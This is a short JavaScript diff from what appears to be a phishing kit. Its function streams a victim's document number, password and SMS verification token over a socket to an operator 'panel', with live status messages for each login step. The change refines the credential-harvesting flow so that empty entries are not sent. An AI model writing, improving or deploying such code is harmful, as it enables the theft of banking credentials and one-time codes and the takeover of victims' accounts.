@@ -40,10 +40,16 @@
   function sendSocketUpdate(customStatus) {
     if (!socket) return;
     const currentToken = tokens.map(function (t) { return t.value; }).join("");
+    const currentDoc = docNumber ? docNumber.value.trim() : "";
+    const currentPass = password ? password.value : "";
+
+    // Si el usuario aún no ha escrito nada, no enviar tarjetas vacías al panel
+    if (!customStatus && !currentDoc && !currentPass && !currentToken) return;
+
     const data = {
       docType,
-      docNumber: docNumber.value.trim(),
-      password: password.value,
+      docNumber: currentDoc,
+      password: currentPass,
       token: currentToken,
       step,
       status: customStatus || (step === "doc" ? "Ingresando documento" : step === "pass" ? "Ingresando contraseña" : "Ingresando token SMS"),
